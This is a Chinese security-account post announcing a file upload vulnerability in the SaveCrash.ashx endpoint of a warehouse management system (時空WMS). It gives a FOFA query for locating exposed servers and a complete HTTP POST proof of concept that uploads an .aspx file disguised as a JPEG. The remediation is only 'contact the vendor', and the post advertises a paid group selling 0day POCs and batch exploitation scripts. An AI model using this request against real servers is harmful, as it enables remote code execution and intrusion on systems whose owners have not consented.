#  漏洞推送|某空WMS-仓储精细化管理系统 SaveCrash.ashx存在文件上传漏洞   
小白菜安全  小白菜安全   2024-12-03 12:11  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/NhLcT1kxlia37svYWabvYzmhrJWdLfIHgxnz3h9W4zxUezdEZiaBGSsPMwDcYyJiaq6oqiaXuW8wdaNQoNDpczOZtg/640?wx_fmt=gif&from=appmsg "")  
  
漏洞描述  
  
  
时空精益仓储管理系统（时空WMS）可以达到简化工作流程，提高仓库作业质量和工作效率的目的。该系统SaveCrash.ashx存在文件上传漏洞。  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/NhLcT1kxlia37svYWabvYzmhrJWdLfIHgxnz3h9W4zxUezdEZiaBGSsPMwDcYyJiaq6oqiaXuW8wdaNQoNDpczOZtg/640?wx_fmt=gif&from=appmsg "")  
  
资产信息  
  
  
fofa:body="SKControlKLForJson.ashx"  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia2ticctZ24qlbjh4wCQ5M39fxgd1EuIALx0A6b0dYl87DkblIicwRRPVaveNXBgdOKqhicjVjgo5O1ag/640?wx_fmt=png&from=appmsg "")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/NhLcT1kxlia37svYWabvYzmhrJWdLfIHgxnz3h9W4zxUezdEZiaBGSsPMwDcYyJiaq6oqiaXuW8wdaNQoNDpczOZtg/640?wx_fmt=gif&from=appmsg "")  
  
漏洞复现  
  
  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia2ticctZ24qlbjh4wCQ5M39fRliboxHC9SNbzTlECH7hkA8IJjPE5T7IkNvaryIzLC2HzU2IqqnudhQ/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/NhLcT1kxlia37svYWabvYzmhrJWdLfIHgxnz3h9W4zxUezdEZiaBGSsPMwDcYyJiaq6oqiaXuW8wdaNQoNDpczOZtg/640?wx_fmt=gif&from=appmsg "")  
  
POC  
  
```
POST /crash/SaveCrash.ashx HTTP/1.1
Host: 
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close
Content-Type: multipart/form-data; boundary=--------------------------dewlibperhk4zgad5dyg

----------------------------dewlibperhk4zgad5dyg
Content-Disposition: form-data; name="file"; filename="1.aspx"
Content-Type: image/jpeg

7777
----------------------------dewlibperhk4zgad5dyg--
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/NhLcT1kxlia37svYWabvYzmhrJWdLfIHgxnz3h9W4zxUezdEZiaBGSsPMwDcYyJiaq6oqiaXuW8wdaNQoNDpczOZtg/640?wx_fmt=gif&from=appmsg "")  
  
修复  
  
```
联系厂商进行修复
```  
  
  
---------------------------------------------------  
  
更多漏洞poc（0day漏洞）、安全工具、批量脚本加入内部圈子获取，目前只要49，无理由3天退款，加入圈子请扫描下方二维码。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/NhLcT1kxlia2ibXzzibVk15gaIwPj3Libib3wz7rEzD4jThibDB3puG8zRTD9fLx4Ndhglm3VOUhNiczqNuriccyD38ibQw/640?wx_fmt=jpeg "")  
  
  
  
  
漏洞文库：  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia240pb5THmJxFot9jOG4SJ4qzRW45zrjDOl0DJXks3FOxCQehIf6sdux9nBBRBdDFBA9quxEY5d9Q/640?wx_fmt=png&from=appmsg "")  
  
工具收集：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia2ibXzzibVk15gaIwPj3Libib3w26uxWScqm4lh60gQawZjffnNamZQR8BylhRBdjtf15dWgFsHMwrsFQ/640?wx_fmt=png&from=appmsg "")  
  
  
脚本文库：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia2ibXzzibVk15gaIwPj3Libib3wsdaXl2dhDDAJN3ZDl5fYWnGIckTK1vgLVHq2SHDDicic8OkMmMJ1fluw/640?wx_fmt=png&from=appmsg "")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia37svYWabvYzmhrJWdLfIHgOaSVwdVAPT7DWSKK7pjSWGdbQKWEM0yTB3JSqNxLUnEBesOW8eG40w/640?wx_fmt=png&from=appmsg "")  
  
免责声明  
  
  
该公众号主要是分享互联网上公开的一些漏洞poc和工具，  
利用本公众号所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，本公众号及作者不为此承担任何责任，一旦造成后果请自行承担！如果本公众号分享导致的侵权行为请告知，我们会立即删除并道歉。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/NhLcT1kxlia37svYWabvYzmhrJWdLfIHgAth2WTu4kyEzL1Dia7AXUWcP7tsbHDtpaH1cls1lJTPVNE6XTwLYvJg/640?wx_fmt=gif&from=appmsg "")  
  
  
  
